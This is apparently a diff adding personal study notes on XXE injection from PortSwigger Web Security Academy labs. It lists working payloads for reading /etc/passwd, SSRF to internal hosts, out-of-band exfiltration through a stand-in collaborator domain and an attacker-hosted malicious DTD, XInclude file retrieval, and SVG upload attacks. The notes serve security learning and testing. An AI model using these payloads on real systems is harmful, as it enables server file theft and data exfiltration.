@@ -1,0 +1,109 @@
+XXE injection
+	
+https://portswigger.net/web-security/xxe
+
+
+
+
+Exploiting XXE to retrieve files
+	Exploiting XXE using external entities to retrieve files
+		intercept "Check stock" packet. notice that xml is used. so add payload - "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>" and then use &xxe entity into productid value.
+	
+--------------------------------------------------------------------------------------
+
+
+Exploiting XXE to perform SSRF attacks
+	Exploiting XXE to perform SSRF attacks
+		intercept "Check stock" packet. notice that xml is used. so add payload - "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>" and go to displayed directories until get private data
+
+
+-------------------------------------------------------------------------------------
+
+
+Detecting blind XXE using out-of-band (OAST) techniques
+	Blind XXE with out-of-band interaction
+		intercept "Check stock" packet. notice that xml is used. so add payload - "<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> ]>" and then use &xxe entity into productid value. check dns loolup on our controlled burp collaborator.
+
+
+	Blind XXE with out-of-band interaction via XML parameter entities
+		intercept "check stock" packet. notice that xml is used. so add payload - "<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> %xxe; ]>". it will bypass parameter restriction and cause dnslookup on our controlled burp collaborator.
+
+
+---------------------------------------------------------------------------------------
+
+Exploiting blind XXE to exfiltrate data out-of-band
+	Exploiting blind XXE to exfiltrate data using a malicious external DTD
+		intercept "Check stock" packet. notice that xml is used. create malicious dtd file into our controlled server. then use payload - "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>" which will execute our dtd file.
+
+----------------------------------------------------------------------------------------
+
+Exploiting blind XXE to retrieve data via error messages
+	Exploiting blind XXE to retrieve data via error messages
+		intercept "Check stock" packet. notice that xml is used. create malicious dtd file into our controlled server which will cause error. then use payload "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>" which will execute our dtd file.
+
+
+----------------------------------------------------------------------------------------
+
+Exploiting blind XXE by repurposing a local DTD
+
+
+----------------------------------------------------------------------------------------
+
+
+Locating an existing DTD file to repurpose
+	Exploiting XXE to retrieve data by repurposing a local DTD
+		intercept "Check stock" packet. notice that xml is used. check internal dtd files with intruder. then check which entitiy is used in that file and theninsert malicious xml code with enitity used in internal dtd file to be overwritten and exploit. it can bypass restriction on remote dtd file.
+
+------------------------------------------------------------------------------------------
+
+
+XInclude attacks
+	Exploiting XInclude to retrieve files
+		Intercept "Check stock" packet. notice that url-encoded form is used but the request is checked with xml in server side. firtly check if request check with xml into server side. so change "productId=1&storeId=1" to "productId=%26entity;&storeId=1" and wait response. if it return that entity isnot supported for security reasons so request is checked by xml into server side. next we have to use XInclude attacks and change request like "productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1" to retrieve files.
+
+
+--------------------------------------------------------------------------------------------
+
+
+XXE attacks via file upload
+	Exploiting XXE via image file upload
+		Upload svg image into comment and intercept that packet. notice that xml is used into svg image. also notice that "Apache Batik library" is used which is vulnerable. to see referces go to site - "https://insinuator.net/2015/03/xxe-injection-in-apache-batik-library-cve-2015-0250/". next we have to change xml like it is mentioned into site i linked below. then go to image location to retrieve information.
+
+
+---------------------------------------------------------------------------------------------
+
+
+XXE attacks via modified content type
+
+POST /action HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+
+foo=bar
+
+
+
+
+
+POST /action HTTP/1.0
+Content-Type: text/xml
+Content-Length: 52
+
+<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
+
+
+
+-------------------------------------------------------------------------------------------------
+
+
+How to find and test for XXE vulnerabilities
+
+
+    Testing for file retrieval by defining an external entity based on a well-known operating system file and using that entity in data that is returned in the application's response.
+    Testing for blind XXE vulnerabilities by defining an external entity based on a URL to a system that you control, and monitoring for interactions with that system. Burp Collaborator client is perfect for this purpose.
+    Testing for vulnerable inclusion of user-supplied non-XML data within a server-side XML document by using an XInclude attack to try to retrieve a well-known operating system file.
+
+
+------------------------------------------------------------------------------------------------------
+
+
